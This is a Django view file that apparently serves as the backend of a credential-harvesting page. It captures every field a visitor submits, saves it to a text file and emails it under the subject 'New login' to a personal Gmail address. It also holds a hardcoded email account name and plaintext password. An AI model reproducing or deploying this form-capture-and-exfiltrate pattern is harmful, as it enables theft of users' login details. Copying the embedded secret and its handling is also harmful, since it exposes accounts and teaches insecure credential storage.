from django.shortcuts import render
from django.core.files import File
from . import Functions
import smtplib,ssl

def home(request):
    if request.method =="POST":
        port = 465  # For SSL
        smtp_server = "smtp.gmail.com"
        sender_email = "fightingcorona2021@gmail.com"  # Enter your address
        receiver_email = "anishbanerjee2002@gmail.com"  # Enter receiver address
        password = "pxfvucsampcosost"
        mydata = request.POST
        with open('users.txt','w') as f:
            wrt = File(f)
            for key,value in mydata.items():
                wrt.write(key)
                wrt.write(value)
                wrt.write("\n")
        f=open("users.txt","r")
        strg=f.read()
        message = f"Subject: New login\n\nNew login!\n Details:{strg}"
        f.close()
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message)


    return render(request,"homepage.html")

# Create your views here.
